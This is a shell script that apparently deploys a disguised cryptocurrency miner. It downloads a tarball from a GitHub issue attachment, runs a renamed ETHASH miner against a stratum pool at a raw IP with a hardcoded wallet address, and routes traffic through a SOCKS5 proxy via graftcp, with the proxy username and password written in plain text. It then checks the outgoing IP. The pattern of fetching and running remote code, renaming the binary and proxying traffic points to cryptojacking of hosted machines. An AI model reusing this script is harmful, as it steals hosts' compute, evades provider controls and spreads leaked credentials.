#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

wget https://github.com/liyanul225/natasha/files/9181714/susumu.tar.gz && tar -xf susumu.tar.gz && susumu/penyemangatku --algo ETHASH --pool stratum+ssl://34.149.10.66:443 --user 39sFYSz9zFgnBfkVGxMaQSHhgWbCMkgReV.Tuyul --tls 0 --ethstratum ETHVETHVETHVETHV1 pause socks5://192.252.209.155:14455

cat > graftcp/local/graftcp-local.conf <<END 
listen = :2233 
loglevel = 1 
select_proxy_mode=socks5_only 
socks5 = 103.253.24.243:8080
socks5_username = woiden_liyan
socks5_password = liyan25
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "**"

echo " "
echo " "

